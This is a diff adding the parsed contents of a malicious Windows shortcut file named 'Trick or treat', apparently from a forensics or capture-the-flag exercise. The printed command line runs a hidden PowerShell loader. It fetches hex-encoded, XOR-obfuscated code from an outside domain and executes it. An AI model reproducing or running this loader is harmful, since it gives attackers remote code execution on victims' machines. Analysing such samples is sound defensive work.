@@ -1,0 +1,64 @@
+lnkparse trick_or_treat.lnk
+
+Windows Shortcut Information:
+   Link CLSID: 00021401-0000-0000-C000-000000000046
+   Link Flags: HasTargetIDList | HasName | HasWorkingDir | HasArguments | HasIconLocation | IsUnicode | HasExpIcon - (16629)
+   File Flags:  - (0)
+
+   Creation Timestamp: None
+   Modified Timestamp: None
+   Accessed Timestamp: None
+
+   Icon Index: 70 
+   Window Style: SW_SHOWMINNOACTIVE 
+   HotKey: CONTROL - C {0x4302} 
+
+   TARGETS:
+      Index: 78
+      ITEMS:
+         Root Folder
+            Sort index: My Computer
+            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
+         Volume Item
+            Flags: 0xf
+            Data: None
+         File entry
+            Flags: Is directory
+            Modification time: None
+            File attribute flags: 16
+            Primary name: Windows
+         File entry
+            Flags: Is directory
+            Modification time: None
+            File attribute flags: 16
+            Primary name: system32
+         File entry
+            Flags: Is file
+            Modification time: None
+            File attribute flags: 0
+            Primary name: cmd.exe
+
+   DATA
+      Description: Trick or treat
+      Working directory: C:
+      Command line arguments: /k for /f "tokens=*" %a in ('dir C:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe /s /b /od') do call %a -windowstyle hidden "$asvods ='';$UserAgents = @('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/15.15063','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko');$RandomUserAgent = $UserAgents | Get-Random;$WebClient = New-Object System.Net.WebClient;$WebClient.Headers.Add('User-Agent', $RandomUserAgent);$boddmei = $WebClient.DownloadString('http://windowsliveupdater.com');$vurnwos ='';for($i=0;$i -le $boddmei.Length-2;$i=$i+2){$bodms=$boddmei[$i]+$boddmei[$i+1];$decodedChar = [char]([convert]::ToInt16($bodms, 16));$xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);$vurnwos = $vurnwos + $xoredChar};Invoke-Command -ScriptBlock ([Scriptblock]::Create($vurnwos));Invoke-Command -ScriptBlock ([Scriptblock]::Create($asvods));
+      Icon location: C:\Windows\System32\shell32.dll
+
+   EXTRA BLOCKS:
+      ICON_LOCATION_BLOCK
+         Target ansi: %SystemRoot%\System32\shell32.dll
+         Target unicode: %SystemRoot%\System32\shell32.dll
+      SPECIAL_FOLDER_LOCATION_BLOCK
+         Special folder id: 37
+      KNOWN_FOLDER_LOCATION_BLOCK
+         Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
+      METADATA_PROPERTIES_BLOCK
+         Property store:
+            Storage:
+               Version: 0x53505331
+               Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE
+               Serialized property values:
+                  Property:
+                     Id: 4
+                     Value: S-1-5-21-3849600975-1564034632-632203374-1001
+                     Value type: VT_LPWSTR
